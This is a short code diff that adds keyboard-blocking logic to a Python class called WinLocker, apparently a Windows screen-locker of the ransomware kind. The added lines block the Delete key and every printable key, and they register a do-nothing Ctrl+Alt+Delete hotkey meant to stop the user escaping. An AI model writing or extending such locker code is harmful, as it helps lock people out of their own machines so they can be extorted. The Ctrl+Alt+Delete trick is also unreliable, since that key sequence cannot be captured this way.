@@ -4,7 +4,12 @@ import datetime
 import ctypes
 import keyboard
 
+keyboard.block_key('Delete')
 
+all_keys = list(range(32, 127))
+for key in all_keys:
+    keyboard.block_key(key)
+    keyboard.add_hotkey('ctrl+alt+delete', lambda: None)
 
 
 class WinLocker:
